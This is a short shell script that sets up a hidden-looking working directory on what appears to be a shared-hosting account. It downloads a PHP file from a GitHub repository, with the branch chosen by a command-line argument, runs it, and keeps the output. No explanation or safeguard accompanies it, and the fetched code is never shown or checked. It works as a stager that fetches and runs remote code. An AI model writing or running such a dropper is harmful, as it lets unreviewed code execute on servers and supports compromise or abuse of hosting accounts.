#!/bin/sh
D=/home/u791571885/dgq56; mkdir -p $D; cd $D || exit 1
[ -f out.txt ] && { cat out.txt; exit 0; }
[ -f started ] && { echo "still running"; exit 0; }
: > started
curl -fsSL -o vq56.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vq56.php"
/opt/alt/php83/usr/bin/php vq56.php > out.tmp 2>&1; mv out.tmp out.txt; cat out.txt
